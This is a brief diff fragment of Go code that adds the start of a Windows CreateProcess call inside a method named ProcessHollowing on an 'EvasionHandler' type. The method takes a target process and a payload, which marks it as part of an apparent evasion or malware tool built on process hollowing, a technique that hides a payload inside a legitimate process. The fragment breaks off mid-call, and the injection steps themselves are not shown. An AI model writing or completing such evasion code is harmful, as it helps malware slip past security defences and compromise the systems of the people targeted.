@@ -148,3 +148,8 @@ func (e *EvasionHandler) ProcessHollowing(targetProcess string, payload []byte) 
 	var pi syscall.ProcessInformation
 	si.Cb = uint32(unsafe.Sizeof(si))
 
+	cmdLine, _ := syscall.UTF16PtrFromString(targetProcess)
+	ret, _, err := createProcess.Call(
+		0,
+		uintptr(unsafe.Pointer(cmdLine)),
+		0, 0, 0,
